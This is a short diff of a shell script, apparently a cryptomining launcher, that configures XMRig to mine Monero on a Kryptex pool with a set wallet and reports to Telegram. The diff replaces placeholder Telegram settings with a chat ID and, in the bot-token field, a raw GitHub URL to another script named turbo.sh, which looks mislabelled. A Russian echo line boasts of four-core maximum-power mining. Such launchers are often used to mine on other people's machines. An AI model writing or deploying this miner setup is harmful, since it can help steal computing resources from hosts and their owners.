@@ -4,8 +4,8 @@
 WALLET="krxYN6R87Q"
 WORKER="${1:-worker}"
 POOL="stratum+tcp://xmr.kryptex.network:7777"
-TELEGRAM_BOT_TOKEN="YOUR_BOT_TOKEN_HERE"
-TELEGRAM_CHAT_ID="YOUR_CHAT_ID_HERE"
+TELEGRAM_BOT_TOKEN="https://raw.githubusercontent.com/fcknjudas/fileshare_linux/refs/heads/main/ultima/turbo.sh"
+TELEGRAM_CHAT_ID="1088254191"
 
 echo "💥 [$(date)] ЗАПУСК XMRig TURBO — 4 ЯДРА, MAX POWER"
 
